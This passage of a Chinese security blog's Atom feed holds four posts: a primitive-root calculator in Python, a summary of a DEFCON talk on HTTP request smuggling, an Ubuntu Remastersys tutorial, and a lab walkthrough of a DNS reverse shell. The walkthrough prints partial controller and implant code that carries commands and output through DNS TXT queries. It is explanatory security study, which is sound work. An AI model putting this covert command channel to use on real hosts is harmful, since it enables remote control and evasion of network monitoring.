-      <category term="scanner" scheme="http://phantom0301.cc/tags/scanner/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>数论基础-原根与指标</title>
-    <link href="http://phantom0301.cc/2016/10/15/primitiveroot/"/>
-    <id>http://phantom0301.cc/2016/10/15/primitiveroot/</id>
-    <published>2016-10-15T09:48:34.000Z</published>
-    <updated>2016-12-08T06:19:34.754Z</updated>
-    
-    <content type="html">&lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;思维导图：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/pic/ac1c3f15dcf2f7dc.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;三位数内的原根求解程序，如果验证有错，欢迎指出~~：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#! /usr/bin/env python
-# -*- coding=UTF-8 -*-
-
-def gcd(a, b):  # 求最大公约数
-    while b != 0:
-        (a,b) = (b, a%b)
-    return a
-
-def factorize(n, wheel=3):  # 因数分解
-    if n &amp;lt; 2:
-        return []
-    primes = (2, 3, 5, 7, 11)
-    if wheel &amp;lt; 2 or wheel &amp;gt; len(primes):
-        wheel = 3
-    primes = primes[:wheel]
-    q = []
-    for p in primes:
-        if n % p != 0:
-            continue
-        e = 1
-        n //= p
-        while n % p == 0:
-            n //= p
-               e += 1
-        q.append((p, e))
-    if n &amp;gt; 1:
-        m = reduce(lambda x, y:x*y, primes, 1)
-        offs = [x for x in xrange(2, m + 1) if gcd(m, x) == 1] + [m + 1]
-        k, done = 0, False
-        while n &amp;gt; 1:
-            for offset in offs:
-                p = k + offset
-                if p ** 2 &amp;gt; n:
-                    done = True
-                    break
-                if n % p != 0:
-                    continue
-                e = 1
-                n //= p
-                while n % p == 0:
-                    n //= p
-                    e += 1
-                q.append((p, e))
-            if done:
-                break
-            k += m
-        if n &amp;gt; 1:
-            q.append((n, 1))
-    return q
-
-def Euler(n, wheel=3):  # 求欧拉函数
-    &amp;apos;&amp;apos;&amp;apos; Euler Totient Function of n using a prime wheel criterion.
-        It&amp;apos;s almost as fast as the phi(n, p) function &amp;apos;&amp;apos;&amp;apos;
-    if n &amp;lt; 2:
-        return n
-    q = factorize(n, wheel)
-    r = 1
-    for (p, e) in q:
-        r *= (p - 1) * (p ** (e - 1))
-    return r
-
-def primitive_root(mod):  # 求原根
-    simple = []
-    root = []
-    phi_m = Euler(mod)
-    for i in range(1,mod):
-        if gcd(i, mod) == 1:
-            simple.append(i)
-    for a in simple:
-        for j in range(1,phi_m+1):
-            if a ** j % mod == 1:
-                if j == phi_m:
-                    root.append(a)
-                else:
-                    break
-
-    return root
-
-if __name__ == &amp;apos;__main__&amp;apos;:
-    mod = raw_input(&amp;apos;Please input mod:&amp;apos;)
-    print primitive_root(int(mod))`
-&lt;/code&gt;&lt;/pre&gt;</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
-    
-    
-      <category term="原根" scheme="http://phantom0301.cc/tags/%E5%8E%9F%E6%A0%B9/"/>
-    
-      <category term="指标" scheme="http://phantom0301.cc/tags/%E6%8C%87%E6%A0%87/"/>
-    
-      <category term="数论" scheme="http://phantom0301.cc/tags/%E6%95%B0%E8%AE%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>没能复现的学习——DEFCON-HTTP-Smuggling</title>
-    <link href="http://phantom0301.cc/2016/09/12/httpsmuggling/"/>
-    <id>http://phantom0301.cc/2016/09/12/httpsmuggling/</id>
-    <published>2016-09-12T12:44:03.000Z</published>
-    <updated>2016-09-19T13:27:33.228Z</updated>
-    
-    <content type="html">&lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x00-闲扯Host-header&quot;&gt;&lt;a href=&quot;#0x00-闲扯Host-header&quot; class=&quot;headerlink&quot; title=&quot;0x00 闲扯Host header&quot;&gt;&lt;/a&gt;0x00 闲扯Host header&lt;/h2&gt;&lt;p&gt;作为重度网络依赖人群，我们每天都使用程序将数百次网页请求抛送到无形的网络空间中去，我们告知网络服务器我们要访问的资源，接受何种格式、何种语言的回应，是否要和服务器维持一段时间的连接，是否需要保存一些状态以及告知服务器你的代理发送人（浏览器或其他）身份。但是我们了解我们发送的这些东西的真正含义吗？&lt;/p&gt;
-&lt;p&gt;其实作为一次网页请求，理论上我们只要告诉服务器我们要的资源url就可以。那么那些多余的键值大体起什么作用呢？&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Accept族，这里的一系列字段决定了客户端接收的类型、压缩方式、字符集、语言等。这一类字段似乎是为了客户体验而产生的，它允许客户对自己喜欢的语言、字符集进行选择，并且提供选择因子“q”来界定对不同资源的喜好程度，q值越大越喜爱。而压缩则提供了更小的带宽占用和更快的访问速度。&lt;/li&gt;
-&lt;li&gt;Cache-Control，缓存控制机制&lt;/li&gt;
-&lt;li&gt;Connection,通常的参数会使用Keep-Alive，这个字段实际上算是对HTTP基础的补充，通过这个字段来使客户端到服务端的连接持续有效。而这个字段就是下面所描述问题的基础之一&lt;/li&gt;
-&lt;li&gt;Cookie，用户体验与隐私、安全势不两立的存在，被广泛研究介绍，就不用多说了。&lt;/li&gt;
-&lt;li&gt;User-Agent，这也是一个有意思的参数，它的存在最早是为了允许服务端差异化的提供页面，根据不同的框架提供不同的页面来适配不同的浏览器。最初，UA还是很单纯的，当时某些浏览器拥有了很好的显示效果，于是服务端检测到它们的时候就提供更好的页面，过了一段时间其他浏览器也有了相似的特性，为了也能够得到同样的页面，就会告诉浏览器自己和别人身份其实差不多，请给我优秀的页面，久而久之，大家的身份相互混来混去，于是大家都叫Mozilla了，然后又like上Gecko……就这样，UA不在那么单纯，浏览器们都充满了套路。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160905203128.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x01-HTTP-Pipeline&quot;&gt;&lt;a href=&quot;#0x01-HTTP-Pipeline&quot; class=&quot;headerlink&quot; title=&quot;0x01 HTTP Pipeline&quot;&gt;&lt;/a&gt;0x01 HTTP Pipeline&lt;/h2&gt;&lt;p&gt;HTTP管线化是作者提到的又一个漏洞基础，管线化使得多个HTTP请求不需要等待应答即可发送，使用这一技术的初衷是提高页面的载入性能，通过一个数据包来发送多个HTTP请求，也可以减轻网络负载压力。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160907214856.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;这是在一次管线化测试中捕获的HTTP包，可以很清晰的看出在这一个TCP包中拥有三个HTTP包。作者把Pipelines称为大多数smuggling问题之源。在我们实际的使用过程中，实际上并没有真正用到这一技术，因为大多数的浏览器默认并不使用HTTP Pipeline。但是实际上根据文档说明，大多数的服务端都应该支持这一技术。&lt;/p&gt;
-&lt;p&gt;对于Pipeline技术而言，虽然同时发出多个HTTP请求，但实际上它们还是有先后顺序的，而回应顺序与发送的先后顺序一致。&lt;/p&gt;
-&lt;h2 id=&quot;0x02-HTTP-Smuggling-协议层面攻击&quot;&gt;&lt;a href=&quot;#0x02-HTTP-Smuggling-协议层面攻击&quot; class=&quot;headerlink&quot; title=&quot;0x02 HTTP Smuggling 协议层面攻击&quot;&gt;&lt;/a&gt;0x02 HTTP Smuggling 协议层面攻击&lt;/h2&gt;&lt;p&gt;前面说到了HTTP Smuggling的两个基础是Header中的keep-alive和pipelining技术，而产生矛盾就产生于客户端与服务器通信经过中间代理这样的结构。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;client——&amp;gt;middleware——&amp;gt;server
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当客户端和代理通信时会使用Pipeline，而代理和服务器通信会保持keep-alive但不会使用Pipeline，而服务端不会意识到这一点，这就会造成两次不一样的请求通过构造会被服务端认为是同一次请求。&lt;/p&gt;
-&lt;p&gt;所以进行smuggling的过程就是：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;客户端发送一个Pipelining的包，里面包含一个有效包和若干无效的http包。&lt;/li&gt;
-&lt;li&gt;请求包顺利通过中间件&lt;/li&gt;
-&lt;li&gt;服务端解析分割了请求包&lt;/li&gt;
-&lt;li&gt;由于错误，请求被服务端部分回应后，服务端认为Keep-alive依然连接，并且使用了Pipelining，于是等待下面的包。&lt;/li&gt;
-&lt;li&gt;而下一个包就不一定是攻击者发送来的，但是作为服务端依然把这个包回应给了攻击者。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;在这里，作者告诉我们其实早在2005年，就已经有人提到了这种利用手法，最终可以造成的效果包括：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;一个forbidden回复&lt;/li&gt;
-&lt;li&gt;DOS掉一台过程中的机器&lt;/li&gt;
-&lt;li&gt;缓存投毒&lt;/li&gt;
-&lt;li&gt;劫持用户凭证&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;接下来的是作者的Demo展示，可惜作者在这里使用go语言和Nodejs来编写中间件和服务端，并没能在本地环境复现作者的手法，这个只能等到以后回顾的时候再来复现了。&lt;/p&gt;
-&lt;h2 id=&quot;0x03-期待的工具-HTTPWookiee&quot;&gt;&lt;a href=&quot;#0x03-期待的工具-HTTPWookiee&quot; class=&quot;headerlink&quot; title=&quot;0x03 期待的工具 HTTPWookiee&quot;&gt;&lt;/a&gt;0x03 期待的工具 HTTPWookiee&lt;/h2&gt;&lt;p&gt;作者在最后还许了一个愿，他会在考虑安全因素的条件下在Github上放出一个相关漏洞代理的自动化测试工具，不过已经过去一个月了吧。&lt;/p&gt;
-&lt;p&gt;看作者的框图，这应该是一个通过发包、接受回应比对来判别代理漏洞利用的工具吧。&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;
-    
-    </summary>
-    
-      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
-    
-    
-      <category term="DEFCON" scheme="http://phantom0301.cc/tags/DEFCON/"/>
-    
-      <category term="Smuggling" scheme="http://phantom0301.cc/tags/Smuggling/"/>
-    
-      <category term="http" scheme="http://phantom0301.cc/tags/http/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>也说DNS反弹Shell</title>
-    <link href="http://phantom0301.cc/2016/08/11/DNSshell/"/>
-    <id>http://phantom0301.cc/2016/08/11/DNSshell/</id>
-    <published>2016-08-11T12:03:39.000Z</published>
-    <updated>2016-08-13T04:25:23.896Z</updated>
-    
-    <content type="html">&lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。&lt;/p&gt;
-&lt;p&gt;反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。&lt;/p&gt;
-&lt;p&gt;最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/ahhh/Reverse_DNS_Shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ahhh/Reverse_DNS_Shell&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib&lt;/p&gt;
-&lt;h2 id=&quot;0x02-DNS&quot;&gt;&lt;a href=&quot;#0x02-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x02 DNS&quot;&gt;&lt;/a&gt;0x02 DNS&lt;/h2&gt;&lt;p&gt;为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ul&gt;
-&lt;li&gt;紧接着的Flags，0x0100表明了一些查询属性。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ul&gt;
-&lt;li&gt;Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;服务器回应包如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;作为回应的Tran ID，它和查询包相同。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ul&gt;
-&lt;li&gt;Flags中标准回应标志位&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ul&gt;
-&lt;li&gt;重复显示的Queries&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ul&gt;
-&lt;li&gt;回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;被控端：  发送DNS请求——&amp;gt;  接收回应并解析执行命令  ——&amp;gt;   发送DNS请求
-              |                    /|\               |
-              |                     |                |
-              |                     |                |
-             \|/                    |               \|/
-控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x03-程序&quot;&gt;&lt;a href=&quot;#0x03-程序&quot; class=&quot;headerlink&quot; title=&quot;0x03 程序&quot;&gt;&lt;/a&gt;0x03 程序&lt;/h2&gt;&lt;p&gt;原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。&lt;/p&gt;
-&lt;p&gt;先说DNS服务器的部分&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def spawnShell(answer, payload):
-  shellInput = raw_input(PROMPT)
-  if shellInput == &amp;apos;quit&amp;apos;: EXIT = 1 
-  if shellInput == &amp;apos;&amp;apos;: spawnShell(answer, payload) 
-  out = base64.b64encode(shellInput)
-  answer.add_answer(
-     *dnslib.RR.fromZone(&amp;apos;{}.com 60 TXT &amp;quot;{}&amp;quot;&amp;apos;.format(payload, out)))
-  return answer
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def recievePayload(udps):
-  data, addr = udps.recvfrom(1024)
-  dnsD = dnslib.DNSRecord.parse(data)
-  payload = dnsD.questions[0].qname.label[0]
-  answer = dnsD.reply()
-  return addr, payload, answer
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。&lt;/p&gt;
-&lt;p&gt;主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。&lt;/p&gt;
-&lt;p&gt;再来看看被控端发送的部分&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def start(host):
-  while 1:
-    a = startConnection(host)
-    cmd = parseCmd(a)
-    stdoutput = runCmd(cmd)
-    sendOutputToServer(stdoutput, host)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def startConnection(host):
-  url = formURL(nextCommand)
-  request = dns.message.make_query(url, dns.rdatatype.TXT)
-  answers = dns.query.udp(request, host)
-  a = answers.to_text()
-  return a
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def parseCmd(a):
-def runCmd(cmd)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;def sendOutputToServer(output, host):
-  send =&amp;apos;&amp;apos;
-  output_end = len(output)
-  for chunk in output:
-    send += chunk
-    output_end -= 1
-    if len(send) == 58:
-      url = formURL(send)
-      dnsMakeQuery(url, host)
-      send =&amp;apos;&amp;apos;
-    if output_end == 0:
-      url = formURL(send)
-      dnsMakeQuery(url, host)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。&lt;/p&gt;
-&lt;h2 id=&quot;0x04-测试&quot;&gt;&lt;a href=&quot;#0x04-测试&quot; class=&quot;headerlink&quot; title=&quot;0x04 测试&quot;&gt;&lt;/a&gt;0x04 测试&lt;/h2&gt;&lt;p&gt;我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;如图，是在Ubuntu上对Win10执行ipconfig命令的显示。&lt;/p&gt;
-&lt;p&gt;我们再进行抓包分析：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，&lt;/p&gt;
-&lt;p&gt;可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。&lt;/p&gt;
-&lt;h2 id=&quot;0x05-延伸&quot;&gt;&lt;a href=&quot;#0x05-延伸&quot; class=&quot;headerlink&quot; title=&quot;0x05 延伸&quot;&gt;&lt;/a&gt;0x05 延伸&lt;/h2&gt;&lt;p&gt;其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。&lt;/p&gt;
-&lt;p&gt;当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
-    
-    
-      <category term="DNS" scheme="http://phantom0301.cc/tags/DNS/"/>
-    
-      <category term="协议分析" scheme="http://phantom0301.cc/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ubuntu服务器下Remastersys系统打包</title>
-    <link href="http://phantom0301.cc/2016/08/08/Remastersys/"/>
-    <id>http://phantom0301.cc/2016/08/08/Remastersys/</id>
-    <published>2016-08-08T13:08:13.000Z</published>
-    <updated>2016-08-08T13:32:18.906Z</updated>
-    
-    <content type="html">&lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;0x01-安装&quot;&gt;&lt;a href=&quot;#0x01-安装&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装&quot;&gt;&lt;/a&gt;0x01 安装&lt;/h2&gt;&lt;p&gt;这里主要是对使用过程中收集到资料的总结。主要是经过了测试。&lt;/p&gt;
-&lt;p&gt;我的系统是官网下下来的Ubuntu server14.04。&lt;/p&gt;
-&lt;p&gt;首先，网上大多数的教程使用添加非官方源的方法自动安装，我在添加密钥时迷之失败了，所以使用下面这篇博客的方法成功率更高。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/chenkun1/p/5532977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/chenkun1/p/5532977.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;访问&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.filewatcher.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.filewatcher.com  &lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;搜索&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;remastersys_3.0.4-2_all.deb
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑若干年后有可能找不到资源，我会上传一份到我的github&lt;/p&gt;
-&lt;p&gt;下载安装包后，存放到合适的目录，在目录下执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo apt-get install plymouth-x11 
-sudo dpkg -i remastersys_3.0.4-2_all.deb
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，就可以执行remastersys指令。&lt;/p&gt;
-&lt;h2 id=&quot;0x02-使用&quot;&gt;&lt;a href=&quot;#0x02-使用&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用&quot;&gt;&lt;/a&gt;0x02 使用&lt;/h2&gt;&lt;p&gt;具体指令的解释，网上有很多。大致我们会用到backup和dist两种方式，backup可以说是对整个系统完全打包，考虑到我们并不需要泄露自己的个人信息，大多数时候我们是使用dist方式做发行&lt;/p&gt;
-&lt;p&gt;参考这篇文章，不过文章里有指令打错了，请注意。&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;简单说，我们顺序执行以下几条命令：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
-sudo remastersys dist iso filename.iso
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将iso移动到安全的地方后，执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo remastersys clean
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;清理掉生成iso时的辅助文件，当然，iso也会被删掉，所以请先将iso移动到安全的地方。&lt;/p&gt;
-&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;做为服务器版，我在执行 &lt;em&gt;remastersys dist cdfs&lt;/em&gt; 命令时报错，根据报错信息中提到的 &lt;em&gt;ubiquity&lt;/em&gt; 信息，我找到了如下的解决方法：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zgyrelax/article/details/18228629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zgyrelax/article/details/18228629&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;简单粗暴点，你需要做的就是执行下面的这条命令&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;apt-get -y install ubiquity*
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，系统会提示你安装相关环境，接着执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;apt-get -f install
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等到一切安装结束后，再次执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及后面的步骤，就可以顺利打包系统。&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="ubuntu" scheme="http://phantom0301.cc/categories/ubuntu/"/>
-    
-    
-      <category term="iso" scheme="http://phantom0301.cc/tags/iso/"/>
-    
-      <category term="ubuntu" scheme="http://phantom0301.cc/tags/ubuntu/"/>
     
   </entry>
   
